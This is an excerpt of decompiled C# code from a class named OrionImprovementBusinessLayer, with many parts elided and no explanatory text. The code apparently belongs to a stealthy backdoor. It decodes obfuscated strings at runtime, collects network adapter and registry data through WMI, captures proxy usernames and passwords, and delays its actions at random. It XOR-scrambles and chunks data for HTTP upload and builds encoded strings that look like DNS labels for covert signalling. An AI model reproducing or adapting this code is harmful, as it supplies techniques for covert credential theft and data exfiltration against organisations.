...
label_27:
      ...
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3Sy0pzy/KdkxJLChJLXLOz0vLTC8tSizJzM9TKM9ILUpV8AxwzUtMyklNsS0pKk0FAA==")))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get().Cast<ManagementObject>())
          {
            ...
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0ktTi7KLCjJzM8DAA=="));
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("83V0dkxJKUotLgYA"));
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/FwDnDNS0zKSU0BAA=="));
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/FwDghOLSpLLQIA"));
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/EL9sgvLvFLzE0FAA=="));
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/ELdsnPTczMCy5NS8usCE5NLErO8C9KSS0CAA=="));
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/ELDk4tKkstCk5NLErO8C9KSS0CAA=="));
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("8wxwTEkpSi0uBgA="));
            ...
            adapterConfiguration += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0lNSyzNKfEMcE8sSS1PrAQA"));
          }
    ...
    private static void DelayMs(double minMs, double maxMs)
    {
      ...
      for (millisecondsTimeout = minMs + new Random().NextDouble() * (maxMs - minMs); millisecondsTimeout >= (double) int.MaxValue; millisecondsTimeout -= (double) int.MaxValue)
    ...
    private static class RegistryHelper
    {
      ...
      public static string GetValue(string key, string valueName, object defaultValue)
      {
        ...
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out subKey), RegistryView.Registry64))
        {
          ...
          {
            object bytes = registryKey2.GetValue(valueName, defaultValue);
            if (bytes != null)
            {
              if (bytes.GetType() == typeof (byte[]))
                return OrionImprovementBusinessLayer.ByteArrayToHexString((byte[]) bytes);
              return bytes.GetType() == typeof (string[]) ? string.Join("\n", (string[]) bytes) : bytes.ToString();
            }
          }
        }
        return (string) null;
                  ...
                  if (result <= 250 + ((1 << OrionImprovementBusinessLayer.svcList.Length) - 1) * 5)
                  {
                    ...
                    if (!_readonly)
                    {
                      for (int index = 0; index < OrionImprovementBusinessLayer.svcList.Length; ++index)
                        OrionImprovementBusinessLayer.svcList[index].stopped = (num & 1 << index) != 0;
                    }
                    return true;
                  }
                }
        ...
        if (string.IsNullOrEmpty(this.proxyString))
        {
          try
          {
            ...
            else
            {
              ...
              if (instance.IsValid)
                this.proxyString = this.proxyString + ":" + instance.Uri + "\t" + (instance.Credential is UsernamePasswordCredential credential1 ? credential1.Username : (string) null) + "\t" + (instance.Credential is UsernamePasswordCredential credential2 ? credential2.Password : (string) null);
            }
          }
          catch
          {
    ...
    private class HttpHelper
    {
      ...
      {
        byte[] numArray = OrionImprovementBusinessLayer.ZipHelper.Compress(body);
        byte[] destinationArray = new byte[numArray.Length + 1];
        destinationArray[0] = (byte) ((IEnumerable<byte>) numArray).Sum<byte>((Func<byte, int>) (b => (int) b));
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] ^= destinationArray[0];
        Array.Copy((Array) numArray, 0, (Array) destinationArray, 1, numArray.Length);
        ...
        out byte[] outData)
      {
        ...
        try
        {
          if (!string.IsNullOrEmpty(response))
          {
            ...
            byte[] numArray2 = new byte[bytes1.Length + bytes2.Length + this.customerId.Length];
            Array.Copy((Array) bytes1, (Array) numArray2, bytes1.Length);
            Array.Copy((Array) bytes2, 0, (Array) numArray2, bytes1.Length, bytes2.Length);
            Array.Copy((Array) this.customerId, 0, (Array) numArray2, bytes1.Length + bytes2.Length, this.customerId.Length);
            numArray1 = OrionImprovementBusinessLayer.HttpHelper.Inflate(numArray2);
            method = numArray1.Length <= 10000 ? OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put : OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Post;
          }
          ...
          {
            int[] intArray = this.GetIntArray(numArray1 != null ? numArray1.Length : 0);
            int count = 0;
            ...
            for (int index1 = 0; index1 < intArray.Length; ++index1)
            {
              ...
              {
                num1 = num3 | 2UL;
                inArray = ((IEnumerable<byte>) numArray1).Skip<byte>(count).Take<byte>(intArray[index1]).ToArray<byte>();
          ...
          return this.CreateUploadRequestImpl(request, numArray1, out outData);
        }
        catch (Exception ex)
        {
        }
      ...
      private int[] GetIntArray(int sz)
      {
        ...
        for (int index = intArray.Length - 1; index >= 0; --index)
        {
          ...
          if (num1 < 16)
          {
            intArray[index] = this.random.Next(16, Math.Min(32, val2) + 1);
            val2 -= intArray[index];
          }
          else
          {
            int num2 = Math.Min(512 - num1, num1 - 16);
            intArray[index] = this.random.Next(num1 - num2, num1 + num2 + 1);
            val2 -= intArray[index];
          }
        }
        return intArray;
    ...
    private class CryptoHelper
    {
      ...
      {
        byte[] destinationArray = new byte[this.guid.Length + (data != null ? data.Length : 0) + 3];
        Array.Clear((Array) destinationArray, 0, destinationArray.Length);
        Array.Copy((Array) this.guid, (Array) destinationArray, this.guid.Length);
        int stringHash = OrionImprovementBusinessLayer.CryptoHelper.GetStringHash(flag);
        destinationArray[this.guid.Length] = (byte) ((stringHash & 983040) >> 16 | (sz & 15) << 4);
        destinationArray[this.guid.Length + 1] = (byte) ((stringHash & 65280) >> 8);
        destinationArray[this.guid.Length + 2] = (byte) (stringHash & (int) byte.MaxValue);
        if (data != null)
          Array.Copy((Array) data, 0, (Array) destinationArray, destinationArray.Length - data.Length, data.Length);
        for (int index = 0; index < this.guid.Length; ++index)
          destinationArray[index] ^= destinationArray[this.guid.Length + 2 - index % 2];
        return destinationArray;
      }
      ...
      public string GetPreviousString(out bool last)
      {
        ...
        if (this.offset >= this.dnStr.Length || this.nCount > 36)
          this.nCount = -1;
        string previousString2 = secureString + OrionImprovementBusinessLayer.CryptoHelper.CreateString(this.nCount, secureString[0]) + this.dnStrLower + this.GetStatus();
        if (this.nCount >= 0)
          ++this.nCount;
        last = this.nCount < 0;
        return previousString2;
      }
